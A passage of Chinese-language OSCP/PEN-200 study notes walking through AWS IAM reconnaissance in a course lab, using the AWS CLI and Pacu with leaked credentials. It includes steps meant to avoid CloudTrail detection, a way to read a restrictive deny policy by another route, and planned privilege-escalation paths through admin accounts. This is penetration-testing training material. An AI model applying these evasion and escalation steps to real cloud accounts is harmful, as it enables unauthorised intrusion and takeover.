 ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⢀⣀⣀⣀⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡏⠉⠉⠉⠉⠀⠀⠀⢸⣿⣿⡏⠉⠉⢹⣿⣿⡇⠀⢸⣿⣿⣇⣀⣀⣸⣿⣿⣿⠀⢸⣿⣿⣿⣀⣀⣀⣿⣿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⡟
 ⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠛⠃⠀⠀⠀⠀⠀⠀⠀⠘⠛⠛⠃⠀⠀⠘⠛⠛⠃⠀⠀⠉⠛⠛⠛⠛⠛⠛⠋⠀⠀⠀⠀⠙⠛⠛⠛⠛⠛⠉⠀

Version: 1.6.0
What would you like to name this new session? offseclab
Session offseclab created.
```
會要求設定一個 新的測試 Session（例如 offseclab）
- 匯入 AWS 憑證
```
Pacu (offseclab:No Keys Set) > import_keys attacker
  Imported keys as "imported-attacker"
```
- 列舉 IAM 角色
```
Pacu (offseclab:imported-attacker) > run iam__enum_roles --word-list /tmp/role-names.txt --account-id {Account ID}
...
[iam__enum_roles]   Successfully assumed role for 1 hour: arn:aws:iam::{Account ID}:role/lab_admin

[iam__enum_roles] {
  "Credentials": {
    ...
}
Cleaning up the PacuIamEnumRoles-jxtnE role.
...

```
> 代表該帳戶存在 lab_admin 角色; 如果回傳錯誤，則代表該角色 不存在

## Initial IAM Reconnaissance
初始 IAM 偵察（Initial IAM Reconnaissance），也就是當成功獲取 AWS 憑證（Access Keys）後，如何 評估這些憑證的權限範圍
- 確認這組憑證是否有效。
- 分析憑證的權限範圍，確保在不觸發警報的情況下最大化利用它。
- 評估可以進行的進一步攻擊：
    - 列舉更多 IAM 使用者或角色？
    - 有權限存取 S3 bucket？
    - 可以建立新的 EC2 執行個體？
    - 提權（Privilege Escalation）？

## Accessing the Lab
設定 AWS CLI 來模擬攻擊者使用已洩露的 AWS 憑證\
Lab 環境中，提供了 三組不同的 AWS 憑證，每組用戶有不同的角色與權限：

>Target 使用者:	🟥 模擬攻擊者獲得的 AWS 憑證，這是主要用來測試的帳戶\
Challenge 使用者:	🟨 一個權限受限的用戶，用來測試某些概念和額外的練習\
Monitor 使用者:	🟩 擁有 CloudTrail 記錄存取權限，用來監控 AWS 活動記錄

1. 設定 AWS CLI 使用 Target 帳戶
```
┌──(chw㉿CHW)-[~]
└─$ aws configure --profile target

AWS Access Key ID [None]: {Target ACCESS KEY ID}
AWS Secret Access Key [None]: {Target ACCESS KEY SECRET}
Default region name [None]: us-east-1
Default output format [None]: json

┌──(chw㉿CHW)-[~]
└─$ aws --profile target sts get-caller-identity
```
2. 設定 AWS CLI 使用 Challenge 帳戶 
```
┌──(chw㉿CHW)-[~]
└─$ aws configure --profile challenge
AWS Access Key ID [None]: {Challenge ACCESS KEY ID}
AWS Secret Access Key [None]: {Challenge ACCESS KEY SECRET}
Default region name [None]: us-east-1
Default output format [None]: json

┌──(chw㉿CHW)-[~]
└─$ aws --profile challenge sts get-caller-identity
```
3. 設定 Monitor 帳戶
登入 AWS 管理控制台
- 輸入 Monitor Username 和 Password 進行登入。
- 進入 CloudTrail 記錄，監控 AWS 內部的 API 請求。

![gif](https://hackmd.io/_uploads/BJuc5_W2ke.gif)


### Examining Compromised Credentials
檢查已洩露的 AWS 憑證，確認權限範圍，並嘗試以低可見度的方式進行偵查，避免被 AWS 監控系統（如 CloudTrail）發現
- 確認憑證是否有效（是否仍能存取 AWS 環境）。
- 檢查該憑證所屬的 AWS 帳戶 ID、使用者名稱和 IAM 角色。
- 測試該憑證的權限範圍，找出可以執行的動作。
- 使用不易被發現的方法來收集資訊，避免觸發 AWS 監控警報（CloudTrail Logs）

#### 1. 使用更隱蔽的方法獲取 AWS 帳戶資訊
##### [Way 1] 使用 iam get-access-key-info
如果想要避免被 CloudTrail 記錄，他們可以用另一組 AWS 帳戶來查詢 Access Key ID 所屬的 AWS 帳戶
```
┌──(chw㉿CHW)-[~]
└─$ aws --profile challenge sts get-access-key-info --access-key-id AKIAQOMAIGYUVEHJ7WXM
{
    "Account": "123456789012"
}
```
> 從外部 AWS 帳戶查詢帳戶 ID，不會在目標帳戶的 CloudTrail 中留下記錄

##### [Way 2] 觸發 AccessDenied 錯誤來獲取資訊
嘗試執行 不存在的 Lambda 函數，AWS 會回應錯誤訊息，但其中包含了帳戶 ID 和 IAM 使用者資訊
```
┌──(chw㉿CHW)-[~]
└─$ aws --profile target lambda invoke --function-name arn:aws:lambda:us-east-1:123456789012:function:nonexistent-function outfile

An error occurred (AccessDeniedException) when calling the Invoke operation: User: arn:aws:iam::{Account ID}:user/support/clouddesk-plove is not authorized to perform: lambda:InvokeFunction on resource: arn:aws:lambda:us-east-1:123456789012:function:nonexistent-function because no resource-based policy allows the lambda:InvokeFunction action
```
> 獲取 AWS 帳戶 ID（`123456789012`）\
獲取 IAM 使用者名稱（`clouddesk-plove`）\
這類錯誤訊息不會被 CloudTrail 預設記錄

#### 2. 使用不同 Region 來降低偵測風險
測試在不同區域執行
```
┌──(chw㉿CHW)-[~]
└─$ aws --profile target sts get-caller-identity --region us-east-2
```

#### 3. 從 CloudTrail 驗證攻擊行為
- 登入 AWS 控制台 並使用 Monitor 使用者 進入 CloudTrail 服務。
- 檢查 GetCallerIdentity 事件，查看是否有來自 us-east-2（或其他區域）的可疑請求。

![gif](https://hackmd.io/_uploads/Sy2t3u-n1l.gif)

>如果管理員只監控 us-east-1，可能不會注意到 us-east-2 內的可疑行為，這正是試圖利用的漏洞。

### Scoping IAM permissions
確認已洩露 AWS 憑證的權限範圍，並透過 AWS IAM 設定查找目標帳戶的權限
#### 1. 列出被洩露帳戶的基本資訊
```
┌──(chw㉿CHW)-[~]
└─$ aws --profile target sts get-caller-identity

{
    "UserId": "AIDAWZJ7PTI575M3SJ553",
    "Account": "{Account ID}",
    "Arn": "arn:aws:iam::{Account ID}:user/support/clouddesk-plove"
}
```
> AWS 帳戶 ID `{Account ID}`\
IAM 使用者名稱為 `clouddesk-plove`\
使用者的 IAM 路徑為 `/support/`

#### 2. 檢查該帳戶的 IAM 權限
列出該使用者的 Inline Policy 與 Managed Policy
```
┌──(chw㉿CHW)-[~]
└─$ aws --profile target iam list-user-policies --user-name clouddesk-plove

{
    "PolicyNames": []
}
      
┌──(chw㉿CHW)-[~]
└─$ aws --profile target iam list-attached-user-policies --user-name clouddesk-plove
{
    "AttachedPolicies": [
        {
            "PolicyName": "deny_challenges_access",
            "PolicyArn": "arn:aws:iam::{Account ID}:policy/deny_challenges_access"
        }
    ]
}

```
#### 3. 檢查該使用者是否屬於 IAM 群組
列出使用者的 IAM 群組
```
┌──(chw㉿CHW)-[~]
└─$ aws --profile target iam list-groups-for-user --user-name clouddesk-plove

{
    "Groups": [
        {
            "Path": "/support/",
            "GroupName": "support",
            "GroupId": "{GroupId}",
            "Arn": "arn:aws:iam::{Account ID}:group/support/support",
            "CreateDate": "2025-03-14T09:30:05+00:00"
        }
    ]
}
```
列出 support 群組的 IAM Policies
```
┌──(chw㉿CHW)-[~]
└─$ aws --profile target iam list-group-policies --group-name support

{
    "PolicyNames": []
}
┌──(chw㉿CHW)-[~]
└─$ aws --profile target iam list-attached-group-policies --group-name support

{
    "AttachedPolicies": [
        {
            "PolicyName": "SupportUser",
            "PolicyArn": "arn:aws:iam::aws:policy/job-function/SupportUser"
        }
    ]
}
```
> 該群組擁有 SupportUser IAM Policy，是一個 AWS Managed policy
#### 4. 分析 SupportUser IAM 政策
確認 SupportUser 的 IAM Policy 版本
```
┌──(chw㉿CHW)-[~]
└─$ aws --profile target iam list-policy-versions --policy-arn arn:aws:iam::aws:policy/job-function/SupportUser

{
    "Versions": [
        {
            "VersionId": "v8",
            "IsDefaultVersion": true,
            "CreateDate": "2023-08-25T18:40:27+00:00"
        },
        {
            "VersionId": "v7",
            "IsDefaultVersion": false,
            "CreateDate": "2022-07-25T22:45:38+00:00"
        },
        ...
```
> 最新版本 v8，接下來可以下載政策的詳細內容

取得 SupportUser 的 IAM Policy 內容
```
┌──(chw㉿CHW)-[~]
└─$ aws --profile target iam get-policy-version --policy-arn arn:aws:iam::aws:policy/job-function/SupportUser --version-id v8

{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Action": [
                        "support:*",
                        "acm:DescribeCertificate",
                        "acm:GetCertificate",
                        "acm:List*",
                        "autoscaling:Describe*",
                        "workspaces:Describe*"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                    ...
```
> `support:*`: 完整存取 AWS Support Service\
`acm:DescribeCertificate`: 可讀 AWS 憑證管理（ACM）\
`autoscaling:Describe*`: 可讀 Auto Scaling 設定\
`workspaces:Describe*`: 可讀 AWS Workspaces 設定\
限制：該帳戶只能讀取（Describe, Get, List），不能創建或刪除資源。

#### - 如果無法查詢 IAM 設定，如何測試權限？
帳戶若無法查詢 IAM 權限，可以用 Brute-force Testing，執行 API 指令來嘗試獲取授權
```
pacu
run iam__bruteforce_permissions --account-id 123456789012
```

## IAM Resources Enumeration
AWS IAM (Identity and Access Management) 資源 Enumeration
- 找出 IAM 使用者 (Users)、群組 (Groups)、角色 (Roles)
- 確認 權限策略 (Policies) 允許進一步操作
- 嘗試獲取 管理員權限 或發現可利用的 權限配置錯誤

### Choosing Between a Manual or Automated Enumeration Approach
- AWS IAM 枚舉：可使用 awscli、pacu
- 雲端 OSINT ：可使用 cloud_enum、Amass
- 權限測試：可使用 enumerate-iam、PMapper

>[!Note]
>目前已掌握的資訊
>![image](https://hackmd.io/_uploads/SJXQBYZ3kl.png)\
>`clouddesk-plove` 屬於 support 群組，並繼承了 SupportUser AWS 預設的管理策略 (AWS Custom-Managed Policy)

#### 1. 查詢該帳號可用的 IAM 權限
使用 `aws iam get-policy-version` 來檢查 SupportUser 這個 Policy，並透過 grep "iam" 來篩選 IAM 相關權限
```
┌──(chw㉿CHW)-[~]
└─$ aws --profile target iam get-policy-version --policy-arn arn:aws:iam::aws:policy/job-function/SupportUser --version-id v8 | grep "iam"
                        "iam:GenerateCredentialReport",
                        "iam:GenerateServiceLastAccessedDetails",
                        "iam:Get*",
                        "iam:List*",
```
> `所有 Get* 開頭的 IAM API`: 可以讀取 IAM 相關的資訊\
`所有 List* 開頭的 IAM API`: 可以列出 IAM 相關資源\
`iam:GenerateCredentialReport`: 產生 IAM 憑證報告\
`iam:GenerateServiceLastAccessedDetails`: 產生服務最近存取詳細資訊

#### 2. 查詢 AWS CLI 支援的 IAM 指令
使用 `aws iam help | grep -E "list-|get-|generate-"` 來查詢有哪些 `list-`、`get-` 或 `generate-` 指令可以用來蒐集資訊
```
┌──(chw㉿CHW)-[~]
└─$ aws --profile target iam help | grep -E "list-|get-|generate-"

       o generate-credential-report
       o generate-organizations-access-report
       o generate-service-last-accessed-details
       o get-access-key-last-used
       o get-account-authorization-details
       o get-account-password-policy
       o get-account-summary
       o get-context-keys-for-custom-policy
       o get-context-keys-for-principal-policy
       o get-credential-report
       o get-group
       ...    
```
> 蒐集 IAM 資源的詳細資訊

#### 3. 枚舉 IAM 資源
##### 3.1 查詢 AWS 帳戶總覽
`get-account-summary` 查詢 AWS 帳號內的 IAM 設定
```
┌──(chw㉿CHW)-[~]
└─$ aws --profile target iam get-account-summary | tee account-summary.json

{
    "SummaryMap": {
        "GroupPolicySizeQuota": 5120,
        "InstanceProfilesQuota": 1000,
        "Policies": 8,
        "GroupsPerUserQuota": 10,
``` 
> 帳號內有 18 個 IAM 使用者, 8 個 IAM 群組, 20 個 IAM 角色 ...

##### 3.2 查詢所有 IAM 使用者、群組、角色
```
┌──(chw㉿CHW)-[~]
└─$ aws --profile target iam list-users | tee users.json
aws --profile target iam list-groups | tee groups.json
aws --profile target iam list-roles | tee roles.json

{
    "Users": [
        ...
```
> admin-alice 這個 IAM 帳號可能具有管理權限\
admin 群組 可能擁有更高的存取權限
##### 3.3 查詢 IAM Policy (管理權限)
```
┌──(chw㉿CHW)-[~]
└─$ aws --profile target iam list-policies --scope Local --only-attached | tee policies.json
{
    "Policies": [
        {
            "PolicyName": "manage-credentials",
            "PolicyId": "ANPAQOMAIGYU3LK3BHLGL",
            "Arn": "arn:aws:iam::123456789012:policy/manage-credentials",
            "Path": "/",
            "DefaultVersionId": "v1",
            "AttachmentCount": 1,
            "PermissionsBoundaryUsageCount": 0,
            "IsAttachable": true,
            "UpdateDate": "2023-10-19T15:45:59+00:00"
        },
...
```
#### - Bypass 限制策略
`clouddesk-plove` 使用者被限制存取某些資源
```
┌──(chw㉿CHW)-[~]
└─$ aws --profile target iam list-attached-user-policies --user-name clouddesk-plove

{
    "AttachedPolicies": [
        {
            "PolicyName": "deny_challenges_access",
            "PolicyArn": "arn:aws:iam::{Account ID}:policy/deny_challenges_access"
        }
    ]
}

```
> `deny_challenges_access` 會阻止我們存取某些資源

試圖檢視這個 policy
```
┌──(chw㉿CHW)-[~]
└─$ aws --profile target iam list-policy-versions --policy-arn arn:aws:iam::123456789012:policy/deny_challenges_access
```
> AccessDenied

#### - 利用其他指令繞過限制
雖然 `list-policy-versions` 被阻擋，但 `get-account-authorization-details` 仍可使用
```
┌──(chw㉿CHW)-[~]
└─$ aws --profile target iam get-account-authorization-details --filter LocalManagedPolicy
...
"PolicyName": "deny_challenges_access",
"Statement": [
    {
        "Action": "*",
        "Effect": "Deny",
        "Condition": {
            "StringEquals": {
                "aws:ResourceTag/challenge": "true"
            }
        }
    }
]
```
> 成功讀取到 deny_challenges_access 的內容且發現這個 Policy 會封鎖所有 `challenge: true` tag

### Processing API Response data with JMESPath
[JMESPath](https://jmespath.org/) 用於查詢 JSON 的語言，並透過 AWS CLI 的 `--query` 參數來使用，以篩選 API 回應中的 JSON 資料
#### - 查詢所有使用者名稱
```
aws --profile target iam get-account-authorization-details --filter User --query "UserDetailList[].UserName"
```
#### - 同時查詢多個欄位
- 陣列格式：
```
aws --profile target iam get-account-authorization-details --filter User --query "UserDetailList[0].[UserName,Path,GroupList]"
```
- 物件格式：
```
aws --profile target iam get-account-authorization-details --filter User --query "UserDetailList[0].{Name: UserName, Path: Path, Groups: GroupList}"
```
![image](https://hackmd.io/_uploads/BykujK-n1e.png)
#### - 過濾包含特定關鍵字的使用者
選出 UserName 包含 "admin" 的所有使用者
```
aws --profile target iam get-account-authorization-details --filter User --query "UserDetailList[?contains(UserName, 'admin')].{Name: UserName}"
```
#### - 同時篩選 IAM 使用者與群組
```
aws --profile target iam get-account-authorization-details --filter User Group --query "{Users: UserDetailList[?Path=='/admin/'].UserName, Groups: GroupDetailList[?Path=='/admin/'].{Name: GroupName}}"
```
#### - 將查詢結果存成檔案後處理
能夠減少 API 請求次數，避免產生過多 log
```
aws --profile target iam get-account-authorization-details --filter User > users.json
jp "UserDetailList[].UserName" < users.json
```
### Running Automated Enumeration with Pacu
Pacu 是一款專門用來進行 AWS 滲透測試 的工具，它包含多個模組來自動化偵查 AWS 環境，包括 IAM 資源、EC2 資源、S3 bucket等。
```
sudo apt update
sudo apt install pacu
pacu
import_keys {aws profile} #AWS IAM 憑證
```
#### - 列出 Pacu 內的所有可用模組
`ls` 顯示所有可用的模組
```
Pacu (offseclab:imported-challenge) > ls

[Category: LATERAL_MOVE]

  cloudtrail__csv_injection
  organizations__assume_role
  sns__subscribe
  vpc__enum_lateral_movement

[Category: RECON_UNAUTH]

  ebs__enum_snapshots_unauth
```
#### - module 用途與執行
```
Pacu (offseclab:imported-challenge) > help iam__enum_users_roles_policies_groups

iam__enum_users_roles_policies_groups written by Spencer Gietzen of Rhino Security Labs.

usage: pacu [--users] [--roles] [--policies] [--groups]

This module requests the info for all users, roles, customer-managed policies, and groups in
the account. If no arguments are supplied, it will enumerate all four, if any are supplied, it
will enumerate those only.

options:
  --users     Enumerate info for users in the account
  --roles     Enumerate info for roles in the account
  --policies  Enumerate info for policies in the account
  --groups    Enumerate info for groups in the account

Pacu (offseclab:imported-challenge) > run iam__enum_users_roles_policies_groups 
```
#### - 檢視 Pacu 存入的資料
當 Pacu 執行某些動作時，它會將資料存入自己的 內部資料庫，使用者可以隨時調閱這些資料。
```
Pacu (enumlab:imported-target) > services
  IAM

Pacu (enumlab:imported-target) > data IAM
{
  "Groups": [
    {
      "Arn": "arn:aws:iam::123456789012:group/admin/admin",
      "GroupId": "AGPAQOMAIGYUZQMC6G5NM",
      "GroupName": "admin",
      "Path": "/admin/"
    },
    {
      "Arn": "arn:aws:iam::123456789012:group/amethyst/amethyst_admin",
      "GroupId": "AGPAQOMAIGYUYF3JD3FXV",
      "GroupName": "amethyst_admin",
      "Path": "/amethyst/"
    },
...
```
>[!Tip]
>自動化列舉的優勢與限制:
Pacu 透過模組 自動化執行 AWS CLI 指令，例如 `aws iam list-users` 或 `aws iam list-roles`\
但 它無法繞過 IAM 權限： 如果已洩露的 IAM 憑證本身沒有權限讀取 IAM 設定，Pacu 也無法獲取資料。且 Pacu 會產生 AWS CloudTrail 記錄，這可能會引起 alert。

### Extracting Insights from Enumeration Data
從 AWS IAM (Identity and Access Management) 的資源枚舉 (enumeration) 資訊中提取關鍵資訊
#### 1. 分析 IAM 用戶 "admin-alice"
透過 `get-account-authorization-details` 查詢 admin-alice 用戶的詳細資訊
```
┌──(chw㉿CHW)-[~]
└─$ aws --profile target iam get-account-authorization-details --filter User Group --query "UserDetailList[?UserName=='admin-alice']"

[
    {
        "Path": "/admin/",
        "UserName": "admin-alice",
        "UserId": "AIDAWZJ7PTI566KLAK2KS",
        "Arn": "arn:aws:iam::{Account ID}:user/admin/admin-alice",
        "CreateDate": "2025-03-14T09:30:06+00:00",
        "GroupList": [
            "admin",
            "amethyst_admin"
        ],
        "AttachedManagedPolicies": [],
        "Tags": [
            {
                "Key": "ce1df3c0-33f8-4eac-bb8a-356a133b3ac0",
                "Value": "ce1df3c0-33f8-4eac-bb8a-356a133b3ac0"
            },
            {
                "Key": "Project",
                "Value": "amethyst"
            }
        ]
    }
]
```
> user 屬於 `/admin/` 路徑，且用戶名稱包含 "admin"，這可能表示具有較高權限\
admin-alice 隸屬於兩個群組：`admin` 與 `amethyst_admin`\
Tag 顯示 Project=amethyst
>> admin-alice 沒有直接附加的 policies，可能繼承群組權限\
Tag 可能會影響權限控制 (ABAC, Attribute-Based Access Control)，也就是 IAM 許可可能依據 tag 決定哪些資源可被存取

#### 2. 分析 IAM 群組權限
查詢 admin 群組 和 amethyst_admin 群組 的權限
```
┌──(chw㉿CHW)-[~]
└─$ aws --profile target iam get-account-authorization-details --filter User Group --query "GroupDetailList[?GroupName=='admin']"
┌──(chw㉿CHW)-[~]
└─$ aws --profile target iam get-account-authorization-details --filter User Group --query "GroupDetailList[?GroupName=='amethyst_admin']"
```
#### 3. 分析 amethyst_admin 策略
接續檢查 amethyst_admin 群組的 policy
```
┌──(chw㉿CHW)-[~]
└─$ aws --profile target iam get-account-authorization-details --filter LocalManagedPolicy --query "Policies[?PolicyName=='amethyst_admin']"
```
>[!Warning]
>The use of the "*" wildcard in a policy often raises concerns regarding the potential over-permissiveness of that policy.

#### 4. 確定攻擊路徑
1. 透過 admin-alice 提升權限
    - 嘗試獲取 admin-alice 的登入憑證（如社交工程、密碼暴力破解）。
    - 直接以 admin-alice 身份進入 AWS 控制台並執行管理操作。
2. 透過 amethyst_admin 群組成員提升權限
    - 嘗試獲取 amethyst_admin 群組成員的存取金鑰 (如 admin-cbarton)。
    - 利用 `iam:CreateAccessKey` 許可，為 admin-alice 建立新存取金鑰，取得完整管理員權限。

![image](https://hackmd.io/_uploads/B18DM5Wn1g.png)

# Attacking AWS Cloud Infrastructure
>[!Caution]
> HackMD 筆記長度限制，接續 [[OSCP, PEN-200] Instructional notes - Part 8](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%208.md)

# [Link to: "[OSCP, PEN-200] Instructional notes - Part 8"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%208.md)
